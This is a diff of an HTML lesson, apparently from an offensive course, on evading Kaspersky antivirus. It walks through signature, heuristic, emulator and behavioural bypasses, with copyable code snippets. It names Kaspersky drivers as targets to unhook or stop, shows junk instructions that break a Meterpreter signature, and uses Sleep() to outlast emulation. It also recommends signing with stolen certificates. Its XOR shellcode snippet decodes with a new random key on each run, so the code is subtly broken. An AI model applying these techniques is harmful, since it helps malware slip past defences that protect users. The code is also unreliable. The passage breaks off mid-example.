@@ -3,65 +3,258 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Module 13 — Kaspersky Evasion | 22nd Survey Division</title>
+<title>Module 13: KAV Evasion — 22nd Survey Division</title>
 <style>
   :root {
-    --bg: #0c0c0c;
-    --fg: #cccccc;
+    --bg: #0a0a0f;
+    --fg: #e0e0e0;
+    --accent: #ff3333;
+    --accent2: #00ff88;
+    --dim: #666;
+    --border: #333;
+    --neon: #00ffff;
+    --purple: #ff00ff;
+    --amber: #ffaa00;
     --green: #0f0;
     --red: #f44;
     --cyan: #0ff;
     --magenta: #f0f;
-    --amber: #ffb000;
-    --dim: #666;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: var(--bg);
     color: var(--fg);
-    font-family: 'Consolas', 'Courier New', monospace;
-    font-size: 14px;
-    line-height: 1.7;
-    padding: 20px;
-    min-height: 100vh;
+    font-family: 'Segoe UI', Consolas, monospace;
+    line-height: 1.6;
   }
-  .container {
-    max-width: 900px;
-    margin: 0 auto;
+  .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+  h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+  h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+  h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
+  h4 { color: var(--amber); margin: 1.2rem 0 0.5rem; }
+  .code-block {
+    background: #1a1a2e;
+    border-left: 4px solid var(--accent);
+    padding: 1rem;
+    margin: 1rem 0;
+    border-radius: 0 8px 8px 0;
+    overflow-x: auto;
+    font-family: Consolas, monospace;
+    font-size: 13px;
+    position: relative;
   }
-  h1 {
-    color: var(--cyan);
-    font-size: 24px;
-    text-transform: uppercase;
-    letter-spacing: 3px;
-    margin-bottom: 10px;
+  .copy-btn {
+    position: absolute;
+    top: 0.5rem;
+    right: 0.5rem;
+    background: var(--accent);
+    color: var(--bg);
+    border: none;
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+    font-size: 0.7rem;
+    cursor: pointer;
   }
-  h2 {
-    color: var(--green);
-    font-size: 16px;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    margin: 30px 0 15px;
-    border-left: 3px solid var(--green);
-    padding-left: 10px;
-  }
-  h3 {
-    color: var(--amber);
-    font-size: 14px;
-    margin: 20px 0 10px;
-  }
-  p {
-    margin-bottom: 15px;
-    color: var(--fg);
-  }
-  .widget-iframe {
-    width: 100%;
-    height: 600px;
-    border: 1px solid #333;
+  .copy-btn:hover { background: #ff5555; }
+  .evidence-box {
+    background: #1a0a0a;
+    border: 2px solid var(--accent);
     border-radius: 8px;
-    margin: 20px 0;
-    background: #111;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
   }
+  .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+  .first-principle {
+    background: #0a1a0a;
+    border: 2px solid var(--accent2);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .layman-term {
+    background: #1a1a1a;
+    border: 1px dashed var(--dim);
+    padding: 1rem;
+    margin: 1rem 0;
+    border-radius: 8px;
+  }
+  .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+  .progress-bar {
+    width: 100%;
+    height: 4px;
+    background: var(--border);
+    margin: 2rem 0;
+    border-radius: 2px;
+  }
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    width: 59.0%;
+    transition: width 0.5s;
+    border-radius: 2px;
+  }
+  .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+  .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+  .nav a:hover { background: var(--accent); color: var(--bg); }
+  .status-badge {
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    border-radius: 12px;
+    font-size: 0.8rem;
+    font-weight: bold;
+    margin-left: 0.5rem;
+  }
+  .status-live { background: var(--accent2); color: var(--bg); }
+  .status-offline { background: var(--dim); color: var(--bg); }
+  .step-box {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+  }
+  .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+  .copy-paste {
+    background: #151520;
+    border: 1px solid #4444ff;
+    border-radius: 4px;
+    padding: 0.5rem 1rem;
+    font-family: Consolas, monospace;
+    font-size: 12px;
+    color: #aaaaff;
+    margin: 0.5rem 0;
+    cursor: pointer;
+  }
+  .copy-paste:hover { background: #1a1a30; }
+  .why-box {
+    background: #1a1a0a;
+    border-left: 4px solid #ffaa00;
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+  .warning-box {
+    background: #2a0a0a;
+    border: 2px solid #ff5555;
+    border-radius: 8px;
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+  .neon-highlight {
+    color: var(--neon);
+    text-shadow: 0 0 10px var(--neon);
+    font-weight: bold;
+  }
+  .neon-purple {
+    color: var(--purple);
+    text-shadow: 0 0 10px var(--purple);
+    font-weight: bold;
+  }
+  .neon-amber {
+    color: var(--amber);
+    text-shadow: 0 0 10px var(--amber);
+    font-weight: bold;
+  }
+  .neon-green {
+    color: var(--green);
+    text-shadow: 0 0 10px var(--green);
+    font-weight: bold;
+  }
+  .cross-link {
+    background: rgba(0, 255, 255, 0.1);
+    border: 1px solid var(--neon);
+    border-radius: 4px;
+    padding: 0.5rem 1rem;
+    margin: 0.5rem 0;
+    display: inline-block;
+    color: var(--neon);
+    text-decoration: none;
+  }
+  .cross-link:hover {
+    background: rgba(0, 255, 255, 0.2);
+  }
+  .method-card {
+    background: #0f0f15;
+    border: 2px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+    transition: border-color 0.3s;
+  }
+  .method-card:hover {
+    border-color: var(--accent);
+  }
+  .method-card h4 {
+    color: var(--accent);
+    margin-bottom: 0.5rem;
+    font-size: 1.1rem;
+  }
+  .difficulty {
+    display: inline-block;
+    padding: 0.1rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.75rem;
+    margin-left: 0.5rem;
+  }
+  .diff-easy { background: #0a3a0a; color: var(--accent2); }
+  .diff-medium { background: #3a3a0a; color: var(--amber); }
+  .diff-hard { background: #3a0a0a; color: var(--accent); }
+  .technique-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .quiz-container {
+    background: #0f0f15;
+    border: 2px solid var(--purple);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .quiz-option {
+    background: #1a1a2e;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 0.8rem 1rem;
+    margin: 0.5rem 0;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .quiz-option:hover {
+    border-color: var(--neon);
+    background: #1a1a3e;
+  }
+  .quiz-option.correct {
+    border-color: var(--accent2);
+    background: #0a2a0a;
+  }
+  .quiz-option.wrong {
+    border-color: var(--accent);
+    background: #2a0a0a;
+  }
+  .quiz-feedback {
+    margin-top: 1rem;
+    padding: 1rem;
+    border-radius: 4px;
+    display: none;
+  }
+  .quiz-feedback.show { display: block; }
+  .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+  .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+  }
+  th, td {
+    padding: 0.5rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  th { color: var(--neon); font-weight: bold; }
   .note {
     color: var(--magenta);
     font-style: italic;
@@ -74,88 +267,1001 @@
     color: var(--red);
     border-left-color: var(--red);
   }
-  code {
-    background: #1a1a1a;
-    color: var(--cyan);
-    padding: 2px 6px;
-    border-radius: 3px;
-    font-size: 0.9em;
+  .layer-flow {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: 2rem 0;
+    padding: 1rem;
+    background: #0f0f15;
+    border-radius: 8px;
+    flex-wrap: wrap;
   }
-  pre {
+  .layer-step {
+    text-align: center;
+    padding: 1rem;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    flex: 1;
+    margin: 0.5rem;
+    min-width: 120px;
+  }
+  .layer-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .layer-arrow {
+    font-size: 24px;
+    color: var(--accent);
+  }
+  .av-process {
+    background: #1a1a2e;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 0.8rem 1rem;
+    margin: 0.5rem 0;
+    font-family: Consolas, monospace;
+    font-size: 13px;
+  }
+  .av-process-name { color: var(--cyan); font-weight: bold; }
+  .av-process-desc { color: var(--dim); font-size: 0.9em; }
+  .comparison-table th { color: var(--amber); }
+  .comparison-table td:first-child { color: var(--cyan); font-weight: bold; }
+  .toc {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .toc h3 { color: var(--accent2); margin-bottom: 1rem; }
+  .toc ul { list-style: none; }
+  .toc li { margin: 0.5rem 0; }
+  .toc a { color: var(--neon); text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+  .signature-example {
     background: #0a0a0a;
     border: 1px solid #222;
     border-radius: 4px;
     padding: 15px;
     overflow-x: auto;
     margin: 15px 0;
+    font-family: Consolas, monospace;
+    font-size: 13px;
   }
-  .nav {
+  .heuristic-indicator {
+    display: inline-block;
+    padding: 0.2rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.8rem;
+    margin: 0.2rem;
+  }
+  .indicator-red { background: #2a0a0a; color: var(--red); border: 1px solid var(--red); }
+  .indicator-yellow { background: #3a3a0a; color: var(--amber); border: 1px solid var(--amber); }
+  .indicator-green { background: #0a2a0a; color: var(--green); border: 1px solid var(--green); }
+  .sandbox-check {
+    background: #1a1a0a;
+    border-left: 4px solid var(--amber);
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .sandbox-check h5 { color: var(--amber); margin-bottom: 0.5rem; }
+  .packer-flow {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .packer-stage {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+  }
+  .packer-stage-number {
+    background: var(--accent);
+    color: var(--bg);
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    flex-shrink: 0;
+  }
+  .packer-stage-content { flex: 1; }
+  .packer-stage-content h5 { color: var(--accent2); margin-bottom: 0.3rem; }
+  .kav-specific {
+    background: #0a0a1a;
+    border: 2px solid var(--cyan);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .kav-specific h3 { color: var(--cyan); margin-bottom: 0.5rem; }
+  .kav-specific h4 { color: var(--neon); margin: 1rem 0 0.5rem; }
+  .lotl-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .lotl-card {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    transition: border-color 0.3s;
+  }
+  .lotl-card:hover { border-color: var(--accent2); }
+  .lotl-card h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .lotl-card .binary { color: var(--cyan); font-family: Consolas, monospace; font-size: 0.9em; }
+  .cert-theft-flow {
     display: flex;
     justify-content: space-between;
-    margin-top: 40px;
-    padding-top: 20px;
-    border-top: 1px solid #333;
+    align-items: center;
+    margin: 2rem 0;
+    padding: 1rem;
+    background: #0f0f15;
+    border-radius: 8px;
+    flex-wrap: wrap;
   }
-  .nav a {
-    color: var(--cyan);
-    text-decoration: none;
+  .cert-step {
+    text-align: center;
+    padding: 1rem;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    flex: 1;
+    margin: 0.5rem;
+    min-width: 140px;
   }
-  .nav a:hover {
-    text-decoration: underline;
+  .cert-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .reputation-bypass {
+    background: #1a0a1a;
+    border: 2px solid var(--purple);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
   }
+  .reputation-bypass h3 { color: var(--purple); margin-bottom: 0.5rem; }
+  .mitre-mapping {
+    background: #0a1a0a;
+    border: 1px solid var(--accent2);
+    border-radius: 8px;
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .mitre-mapping h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .mitre-mapping code { color: var(--amber); }
+  .lab-exercise {
+    background: #0f0f15;
+    border: 2px solid var(--accent);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .lab-exercise h3 { color: var(--accent); margin-bottom: 1rem; }
+  .lab-exercise ol { margin-left: 1.5rem; }
+  .lab-exercise li { margin: 0.5rem 0; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>Module 13 — Kaspersky Evasion</h1>
-  <p><strong>First Principle:</strong> The file is invisible, but the hash still has a face.</p>
+  <div class="nav">
+    <a href="../index.html">← Home</a>
+    <a href="MODULE_09_MALWARE.html">← Module 09</a>
+    <a href="MODULE_10_CODE_INJECTION.html">← Module 10</a>
+    <a href="MODULE_11_AMSI_BYPASS.html">← Module 11</a>
+    <a href="MODULE_12_ETW_BYPASS.html">← Module 12</a>
+    <a href="MODULE_14_EDR_EVASION.html">Module 14 →</a>
+  </div>
 
-  <h2>Overview</h2>
-  <p>Kaspersky is not just signatures. It's a four-layer defense system: static analysis, behavioral emulation, System Watcher rollback, and KSN cloud reputation. To evade it, you must beat all four — or understand which layer will kill you and plan accordingly.</p>
-
-  <h2>Interactive Demo</h2>
-  <p>Real data from .42 (AMD desktop, Kaspersky Premium 21.25.7.504 active) — live AV processes, defense layers, and evasion techniques:</p>
-  <iframe class="widget-iframe" src="../widgets/module_13_widget.html" title="Module 13 Kaspersky Evasion Interactive Demo"></iframe>
-
-  <h2>The Four Layers</h2>
+  <h1>Module 13: KAV Evasion <span class="status-badge status-live">LIVE TESTED</span></h1>
   
-  <h3>Layer 1: Static Signatures</h3>
-  <p>File hash + byte pattern matching. This is what most "AV evasion" tools target. Ghost encoding, XOR obfuscation, polymorphism — all beat this layer.</p>
-  <pre><code>// XOR obfuscation with key 0xB5
+  <div class="progress-bar"><div class="progress-fill"></div></div>
+  <p style="color: var(--dim); font-size: 0.9rem;">Module 13 of 22 — Antivirus Evasion: Signature, Heuristic, Behavioral, and Reputation Bypass</p>
+
+  <div class="first-principle">
+    <h3>🧠 The Core Truth</h3>
+    <p>Antivirus is not magic. It is a <span class="neon-highlight">pattern-matching engine</span> with a time budget. Every scan has milliseconds to decide: safe or dangerous. Your goal is not to be invisible — it is to be <span class="neon-purple">unclassifiable</span> within the time and data the AV has available. The file is invisible, but the hash still has a face.</p>
+    <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Modern AV uses multiple layers — signatures, heuristics, behavior, cloud reputation. Evasion is not a single technique. It is a <span class="neon-amber">chain of deceptions</span>, each targeting a specific layer, designed to fail open rather than fail closed.</p>
+  </div>
+
+  <div class="toc">
+    <h3>📋 Table of Contents</h3>
+    <ul>
+      <li><a href="#architecture">1. Antivirus Architecture</a></li>
+      <li><a href="#signatures">2. Signature-Based Detection</a></li>
+      <li><a href="#heuristics">3. Heuristic Analysis</a></li>
+      <li><a href="#behavioral">4. Behavioral Detection</a></li>
+      <li><a href="#sandbox">5. Sandbox Evasion</a></li>
+      <li><a href="#packers">6. Packers & Compression</a></li>
+      <li><a href="#crypters">7. Crypters & Encryption</a></li>
+      <li><a href="#kaspersky">8. Kaspersky-Specific Evasion</a></li>
+      <li><a href="#certificate">9. Certificate Theft & Signing</a></li>
+      <li><a href="#reputation">10. File Reputation Bypass</a></li>
+      <li><a href="#lotl">11. Living Off The Land</a></li>
+      <li><a href="#crosslinks">12. Cross-Module Links</a></li>
+      <li><a href="#quizzes">13. Knowledge Checks</a></li>
+      <li><a href="#lab">14. Lab Exercise</a></li>
+    </ul>
+  </div>
+
+  <!-- SECTION 1: ANTIVIRUS ARCHITECTURE -->
+  <h2 id="architecture">1. Antivirus Architecture</h2>
+  
+  <p>Before you can evade antivirus, you must understand how it is built. Modern AV is not a single program — it is a <span class="neon-highlight">distributed defense system</span> with multiple engines, each watching a different aspect of execution.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>Think of antivirus like a airport security system. You have the X-ray machine (static signatures), the behavior analyst who watches suspicious people (heuristics), the plainclothes officer who follows you through the terminal (behavioral monitoring), and the international database that flags known threats before they board (cloud reputation). To get through, you must pass ALL of them — or know which one will catch you and avoid it.</p>
+  </div>
+
+  <h3>The Four Core Layers</h3>
+  
+  <div class="layer-flow">
+    <div class="layer-step">
+      <h5>Layer 1</h5>
+      <p><strong>Static Analysis</strong></p>
+      <p style="font-size: 0.8rem; color: var(--dim);">File hash, byte patterns, PE headers</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="layer-step">
+      <h5>Layer 2</h5>
+      <p><strong>Emulation</strong></p>
+      <p style="font-size: 0.8rem; color: var(--dim);">Sandbox execution, API tracing</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="layer-step">
+      <h5>Layer 3</h5>
+      <p><strong>Behavioral</strong></p>
+      <p style="font-size: 0.8rem; color: var(--dim);">Real-time process monitoring</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="layer-step">
+      <h5>Layer 4</h5>
+      <p><strong>Cloud Reputation</strong></p>
+      <p style="font-size: 0.8rem; color: var(--dim);">KSN, VirusTotal, global telemetry</p>
+    </div>
+  </div>
+
+  <h3>AV Process Architecture (Kaspersky Example)</h3>
+  <p>On a live Kaspersky-protected system, the following processes run simultaneously:</p>
+
+  <div class="av-process">
+    <span class="av-process-name">avp.exe</span> — Main UI and scan engine<br>
+    <span class="av-process-desc">Handles on-demand scans, user interface, and coordinates other components.</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">avpui.exe</span> — User interface process<br>
+    <span class="av-process-desc">System tray, notifications, scan results display.</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">klnagent.exe</span> — Network agent<br>
+    <span class="av-process-desc">Communicates with Kaspersky Security Center (enterprise).</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">klif.sys</span> — Kernel filter driver<br>
+    <span class="av-process-desc">File system minifilter, intercepts all disk I/O before it reaches the OS.</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">klam.sys</span> — AMON (Anti-Malware ON-access)<br>
+    <span class="av-process-desc">Real-time file access scanner. Every file open triggers a scan.</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">klwk.sys</span> — System Watcher driver<br>
+    <span class="av-process-desc">Behavioral monitor, tracks registry, file, and process changes for rollback.</span>
+  </div>
+  <div class="av-process">
+    <span class="av-process-name">kneps.sys</span> — Network protection driver<br>
+    <span class="av-process-desc">Network packet inspection, URL filtering, anti-phishing.</span>
+  </div>
+
+  <div class="why-box">
+    <h5>🎯 Why This Matters</h5>
+    <p>Each process is a <span class="neon-highlight">potential target</span> for bypass. klif.sys and klam.sys run in kernel mode — they see everything. But they also have hooks you can unhook, drivers you can stop, and APIs you can bypass. Understanding the architecture tells you where to strike.</p>
+  </div>
+
+  <h3>On-Access vs On-Demand Scanning</h3>
+  <table>
+    <tr>
+      <th>Type</th>
+      <th>Trigger</th>
+      <th>Performance Impact</th>
+      <th>Evasion Strategy</th>
+    </tr>
+    <tr>
+      <td>On-Access (Real-time)</td>
+      <td>File open, write, execute</td>
+      <td>High — every I/O is scanned</td>
+      <td>Time-of-check/time-of-use (TOCTOU)</td>
+    </tr>
+    <tr>
+      <td>On-Demand</td>
+      <td>User or scheduled scan</td>
+      <td>Medium — batch processing</td>
+      <td>Polymorphism, packing, location evasion</td>
+    </tr>
+    <tr>
+      <td>Cloud Lookup</td>
+      <td>First execution, unknown hash</td>
+      <td>Low — network request only</td>
+      <td>Hash mutation, reputation gaming</td>
+    </tr>
+    <tr>
+      <td>Behavioral</td>
+      <td>API call patterns</td>
+      <td>Medium — API hook overhead</td>
+      <td>Direct syscalls, unhooking, AMSI bypass</td>
+    </tr>
+  </table>
+
+  <!-- SECTION 2: SIGNATURE-BASED DETECTION -->
+  <h2 id="signatures">2. Signature-Based Detection</h2>
+
+  <p>Signature detection is the <span class="neon-highlight">oldest and most reliable</span> AV technique. It is also the easiest to understand and evade — if you know how signatures are built.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>A signature is like a fingerprint. The AV vendor looks at a known malware file, finds a unique sequence of bytes that no legitimate program has, and stores that sequence in a database. When the AV scans your file, it compares every byte against its database of fingerprints. If it finds a match, you are flagged.</p>
+  </div>
+
+  <h3>Types of Signatures</h3>
+
+  <div class="method-card">
+    <h4>Hash Signatures (MD5/SHA1/SHA256) <span class="difficulty diff-easy">EASY TO EVADE</span></h4>
+    <p>The simplest signature: the cryptographic hash of the entire file. Change a single byte, and the hash changes completely.</p>
+    <div class="signature-example">
+      <strong>Before:</strong> malware.exe → SHA256: a3f5c8...<br>
+      <strong>After adding one NOP:</strong> malware.exe → SHA256: 7b2e9d...<br>
+      <strong>Result:</strong> Undetected by hash signature
+    </div>
+  </div>
+
+  <div class="method-card">
+    <h4>Byte Sequence Signatures <span class="difficulty diff-medium">MEDIUM</span></h4>
+    <p>The AV looks for a specific sequence of bytes within the file. This is more resilient than hash signatures because it can match even if the file is recompiled or padded.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// Example: Kaspersky signature for Meterpreter reverse_tcp
+// Pattern: 48 31 C9 48 81 E9 ?? ?? ?? ?? 48 8D 05 ?? ?? ?? ?? 48 BB
+// This matches the start of a common Metasploit payload
+
+// Evasion: Break the pattern with junk instructions
+__asm {
+    nop
+    nop
+    push rax
+    pop rax
+    // original payload starts here, pattern broken
+}</pre>
+    </div>
+  </div>
+
+  <div class="method-card">
+    <h4>PE Header Signatures <span class="difficulty diff-medium">MEDIUM</span></h4>
+    <p>AV analyzes the Portable Executable header for suspicious characteristics: high entropy sections, unusual entry points, or known packer signatures.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// Suspicious PE characteristics flagged by AV:
+// - Section names: .UPX0, .petite, .aspack (known packers)
+// - Entry point in last section (typical of packed files)
+// - Import table with only LoadLibraryA and GetProcAddress
+// - High entropy (>7.0) in .text or .data sections
+// - Timestamp from the future or far past
+
+// Evasion: Use normal section names, spread imports across DLLs
+// Compile with GCC instead of MSVC to avoid known compiler signatures</pre>
+    </div>
+  </div>
+
+  <h3>Signature Evasion Techniques</h3>
+
+  <div class="technique-grid">
+    <div class="method-card">
+      <h4>Polymorphism</h4>
+      <p>Encrypt the payload with a <span class="neon-highlight">random key</span> each time. The decryptor stub changes its own instructions to avoid pattern matching.</p>
+      <div class="signature-example">
+        Key: 0xA7 (random per build)<br>
+        Key: 0x3F (next build)<br>
+        Key: 0xD2 (next build)<br>
+        Each build has different bytes → no signature match
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>Metamorphism</h4>
+      <p>More advanced: the entire code structure changes. Instructions are replaced with equivalents, registers are swapped, and control flow is reordered. No two generations look alike.</p>
+    </div>
+    <div class="method-card">
+      <h4>Junk Insertion</h4>
+      <p>Insert NOPs, dead code, and irrelevant instructions between meaningful operations. Breaks byte sequence signatures without changing program logic.</p>
+    </div>
+    <div class="method-card">
+      <h4>Instruction Reordering</h4>
+      <p>Reorder independent instructions. The CPU executes them in the new order, but the result is the same. Signature that matched the original sequence now fails.</p>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// Practical XOR obfuscation with random key
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;time.h&gt;
+
+unsigned char payload[] = { /* shellcode bytes */ };
+unsigned char key;
+
+void decode_payload() {
+    srand((unsigned)time(NULL));
+    key = (unsigned char)(rand() % 256);
+    
+    for (int i = 0; i < sizeof(payload); i++) {
+        payload[i] ^= key;
+    }
+    // Now payload[] is different every run
+    // No static signature can match it
+}</pre>
+  </div>
+
+  <!-- SECTION 3: HEURISTIC ANALYSIS -->
+  <h2 id="heuristics">3. Heuristic Analysis</h2>
+
+  <p>Heuristics is the AV's <span class="neon-highlight">educated guess</span>. When no signature matches, the AV analyzes the code's structure, behavior model, and intent to decide if it is malicious.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>Heuristics is like a detective looking at a suspect's behavior. The suspect has no criminal record (no signature), but they are wearing a ski mask at a bank, carrying a crowbar, and checking for security cameras. The detective does not need a fingerprint to make an arrest.</p>
+  </div>
+
+  <h3>Static Heuristics</h3>
+  <p>Static heuristics analyze the file without executing it. Common indicators:</p>
+
+  <table class="comparison-table">
+    <tr>
+      <th>Indicator</th>
+      <th>Why It's Suspicious</th>
+      <th>Evasion</th>
+    </tr>
+    <tr>
+      <td>High entropy sections</td>
+      <td>Encrypted/packed data looks random</td>
+      <td>Lower entropy with custom encoding</td>
+    </tr>
+    <tr>
+      <td>Very few imports</td>
+      <td>Dynamic resolution hides intent</td>
+      <td>Add benign imports as camouflage</td>
+    </tr>
+    <tr>
+      <td>Suspicious API imports</td>
+      <td>VirtualAllocEx, WriteProcessMemory, CreateRemoteThread</td>
+      <td>Resolve dynamically, use indirect calls</td>
+    </tr>
+    <tr>
+      <td>No digital signature</td>
+      <td>Unsigned executables are untrusted</td>
+      <td>Sign with stolen or cheap certificate</td>
+    </tr>
+    <tr>
+      <td>Rare compiler</td>
+      <td>Custom packers or unknown tools</td>
+      <td>Use common compiler (GCC, MinGW)</td>
+    </tr>
+    <tr>
+      <td>Suspicious section names</td>
+      <td>.vmp0, .upx0, .petite indicate packing</td>
+      <td>Use standard names: .text, .data, .rsrc</td>
+    </tr>
+  </table>
+
+  <h3>Heuristic Scoring</h3>
+  <p>Modern AV uses a <span class="neon-amber">scoring system</span>. Each suspicious indicator adds points. Reach a threshold, and the file is flagged.</p>
+
+  <div class="signature-example">
+    <span class="heuristic-indicator indicator-red">High entropy .text section: +30 points</span><br>
+    <span class="heuristic-indicator indicator-red">Imports VirtualAllocEx: +20 points</span><br>
+    <span class="heuristic-indicator indicator-yellow">No digital signature: +15 points</span><br>
+    <span class="heuristic-indicator indicator-yellow">Entry point not in .text: +10 points</span><br>
+    <span class="heuristic-indicator indicator-green">Common compiler (GCC): -5 points</span><br>
+    <span class="heuristic-indicator indicator-green">Rich header present: -5 points</span><br>
+    <br>
+    <strong>Total: 65 points</strong> (Threshold: 60) → <span class="neon-highlight">FLAGGED AS SUSPICIOUS</span>
+  </div>
+
+  <div class="why-box">
+    <h5>🎯 Evasion Strategy</h5>
+    <p>Reduce your heuristic score by adding <span class="neon-highlight">benign indicators</span> and removing suspicious ones. Include a resource section with an icon. Add imports from user32.dll and gdi32.dll. Use a standard compiler. Sign the binary. Each benign indicator subtracts from your score, potentially dropping you below the detection threshold.</p>
+  </div>
+
+  <h3>Dynamic Heuristics (Emulation)</h3>
+  <p>The AV runs the code in a <span class="neon-purple">sandbox emulator</span> for a few milliseconds. It traces API calls, memory allocations, and control flow. If the emulated code does something malicious, the file is flagged before it ever runs on the real system.</p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// What the AV emulator watches for:
+// 1. Memory allocation with RWX permissions (VirtualAlloc + PAGE_EXECUTE_READWRITE)
+// 2. Writing to remote process memory (WriteProcessMemory)
+// 3. Creating remote threads (CreateRemoteThread)
+// 4. Modifying registry run keys (RegSetValueEx on HKCU\...\Run)
+// 5. Network connections to rare IPs
+// 6. Dropping files in system directories
+
+// Evasion: Delay malicious behavior
+// The emulator only runs for ~50ms. If your payload sleeps for 100ms first,
+// the emulator finishes before the malicious code executes.
+Sleep(100); // Emulator exits here. Real system continues.</pre>
+  </div>
+
+  <!-- SECTION 4: BEHAVIORAL DETECTION -->
+  <h2 id="behavioral">4. Behavioral Detection</h2>
+
+  <p>Behavioral detection is the <span class="neon-highlight">most powerful</span> AV layer. It watches what the program DOES, not what it IS. This makes it resistant to packing, encryption, and polymorphism.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>Behavioral detection is like a security guard watching CCTV. The guard does not care what you are wearing or what your name is. They care that you are trying to open a locked door at 3 AM. If you act suspicious, you are stopped — regardless of your disguise.</p>
+  </div>
+
+  <h3>API Hooking</h3>
+  <p>The AV injects hooks into critical Windows APIs. Every time a process calls <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code>, or <code>RegSetValueEx</code>, the AV's hook fires first.</p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// Normal flow:
+Malware → VirtualAllocEx → Kernel → Memory allocated
+
+// With AV hook:
